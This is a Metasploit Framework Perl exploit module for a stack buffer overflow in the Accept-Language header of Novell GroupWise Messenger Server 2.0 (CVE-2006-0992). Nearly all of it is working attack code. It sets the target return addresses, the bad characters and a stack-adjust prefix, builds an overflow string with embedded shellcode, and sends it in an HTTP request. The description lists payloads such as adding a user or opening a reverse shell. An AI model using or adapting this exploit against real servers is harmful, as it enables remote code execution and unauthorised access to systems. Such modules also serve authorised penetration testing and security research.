Novell Messenger Server 2.0 (Accept-Language) Remote Overflow Exploit
=====================================================================

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::novell_messenger_acceptlang;
use strict;
use base "Msf::Exploit";
use Pex::Text;

my $advanced = { };

my $info =
  {
	&#039;Name&#039;    => &#039;Novell Messenger Server 2.0 Accept-Language Overflow&#039;,
	&#039;Version&#039; => &#039;$Revision: 1.5 $&#039;,
	&#039;Authors&#039; => [ &#039;H D Moore <hdm[at]metasploit.com>&#039; ],

	&#039;Arch&#039;  => [ &#039;x86&#039; ],
	&#039;OS&#039;    => [ &#039;win32&#039;, &#039;winnt&#039;, &#039;winxp&#039;, &#039;win2k&#039;, &#039;win2003&#039; ],
	&#039;Priv&#039;  => 1,

	&#039;AutoOpts&#039;  =>  { &#039;EXITFUNC&#039; => &#039;process&#039; },

	&#039;UserOpts&#039;  =>
	  {
		&#039;RHOST&#039; => [1, &#039;ADDR&#039;, &#039;The target address&#039;],
		&#039;RPORT&#039; => [1, &#039;PORT&#039;, &#039;The target port&#039;, 8300 ],
		&#039;VHOST&#039; => [0, &#039;DATA&#039;, &#039;The virtual host name of the server&#039;],
		&#039;SSL&#039;   => [0, &#039;BOOL&#039;, &#039;Use SSL&#039;],
	  },

	&#039;Payload&#039; =>
	  {
		&#039;Space&#039;     => 500, 
		&#039;BadChars&#039;  => "\x00\x0a\x2c\x3b".join("", ("A".."Z")), # data is downcased
		&#039;Keys&#039; 	    => [&#039;+ws2ord&#039;],
		&#039;Prepend&#039;   => "\x81\xc4\x54\xf2\xff\xff",  # add esp, -3500
	  },

	&#039;Description&#039;  => Pex::Text::Freeform(qq{
		This module exploits a stack overflow in Novell GroupWise
	Messenger Server v2.0. This flaw is triggered by any HTTP
	request with an Accept-Language header greater than 16 bytes.
	To overwrite the return address on the stack, we must first
	pass a memcpy() operation that uses pointers we supply. Due to the
	large list of restricted characters and the limitations of the current
	encoder modules, very few payloads are usable. The &#039;known good&#039; set
	includes win32_adduser, win32_exec, and win32_reverse_ord;

}),

	&#039;Refs&#039;  =>
	  [
	  	[&#039;OSVDB&#039;, &#039;24617&#039;],
	  	[&#039;BID&#039;, &#039;17503&#039;],
		[&#039;CVE&#039;, &#039;2006-0992&#039;],
	  ],

	&#039;Targets&#039; =>
	  [
		[ &#039;Groupwise Messenger DClient.dll v10510.37&#039;, 0x6103c3d3, 0x61041001 ] # .data | jmp esp
	  ],

	&#039;Keys&#039;  => [&#039;groupwise&#039;],

	&#039;DisclosureDate&#039; => &#039;Apr 13 2005&#039;,
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({&#039;Info&#039; => $info, &#039;Advanced&#039; => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self        = shift;
	my $target_host = $self->GetVar(&#039;RHOST&#039;);
	my $target_port = $self->GetVar(&#039;RPORT&#039;);
	my $target_idx  = $self->GetVar(&#039;TARGET&#039;);
	my $shellcode   = $self->GetVar(&#039;EncodedPayload&#039;)->Payload;
	my $target      = $self->Targets->[$target_idx];

	$self->PrintLine( "[*] Attempting to exploit " . $target->[0] );

	my $s = Msf::Socket::Tcp->new(
		&#039;PeerAddr&#039;  => $target_host,
		&#039;PeerPort&#039;  => $target_port,
		&#039;SSL&#039;      => $self->GetVar(&#039;SSL&#039;),
	  );

	if ( $s->IsError ) {
		$self->PrintLine( &#039;[*] Error creating socket: &#039; . $s->GetError );
		return;
	}

	my $pattern = Pex::Text::AlphaNumText(1900);
	substr($pattern, 16, 4,  pack(&#039;V&#039;, $target->[2])); # SRC
	substr($pattern, 272, 4, pack(&#039;V&#039;, $target->[2])); # DST
	substr($pattern, 264, 4, pack(&#039;V&#039;, $target->[1])); # JMP ESP
	substr($pattern, 268, 2, "\xeb\x06"); # JMP +6	
	substr($pattern, 276, length($shellcode), $shellcode);

	my $request =
	  "GET / HTTP/1.1\r\n".
	  "Accept-Language: $pattern\r\n".
	  "\r\n";
	
	$s->Send($request);

	$self->PrintLine("[*] Overflow request sent...");

	$self->Handler($s);
	return;
}

1; 


